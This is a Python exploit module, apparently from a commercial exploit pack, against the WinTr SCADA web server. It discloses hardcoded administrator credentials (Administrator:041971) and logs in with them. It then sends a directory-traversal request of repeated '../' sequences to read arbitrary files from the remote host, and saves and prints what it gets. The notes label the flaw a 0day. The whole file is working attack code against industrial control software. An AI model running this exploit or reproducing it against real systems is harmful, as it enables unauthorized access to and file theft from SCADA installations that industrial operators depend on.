import sys
import urllib2
import re

from Sploit import Sploit
from collections import OrderedDict


INFO = {}
INFO['NAME'] = "efs_wintr_scada_hardcoded_credentials_directory_traversal"
INFO['DESCRIPTION'] = "WinTr Scada Hardcoded Credentials Directory Traversal"
INFO['VENDOR'] = "https://www.fultek.com.tr/en/scada/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Specially crafted GET request to WinTr webserver allows to disclose file on remote machine.
Authentication may be required, but WinTr contains hardcoded credentials:  Administrator:041971
Checked against WinTr 5.5.2 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://www.fultek.com.tr/ScadaSoftwareDownload.html"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "4 Apr, 2018. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 8001
OPTIONS["FILENAME"] = 'windows/win.ini'


class exploit(Sploit):
    def __init__(self, host='127.0.0.1', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = int(self.args.get('PORT', OPTIONS['PORT']))
        self.filename = self.args.get('FILENAME', OPTIONS['FILENAME'])
        self.auth_key = ''

    def make_url(self, path=''):
        url = 'http://%s:%s/%s' % (self.host, self.port, path)
        if self.auth_key:
            url += '?'+self.auth_key
        return url

    def login(self):
        self.log('[*] Trying to login using hardcoded credentials')
        url = self.make_url('html_form_action.asp?user=Administrator&pwd=041971')
        res = urllib2.urlopen(url).read()
        try:
            res = re.search("'1;url=index.html\?(.+?)'", res).group(1)
            self.auth_key = res
        except:
            self.log('[-] Can\'t get auth key')
            self.log('[*] Checking directory traversal without auth')

    def run(self):
        self.args()
        url = self.make_url()
        self.log('[*] Checking connection to %s' % url)
        urllib2.urlopen(url)
        self.login()
        self.log('[*] Trying to get contents of "%s"' % self.filename)
        req = urllib2.Request(self.make_url(urllib2.quote('../' * 7 + self.filename)), 
                              headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64;)"})
        res = urllib2.urlopen(req).read()
        self.writefile(res)
        if len(res) < 10000:
            self.log('[+]\r\n' + res)
        self.finish(True)


if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()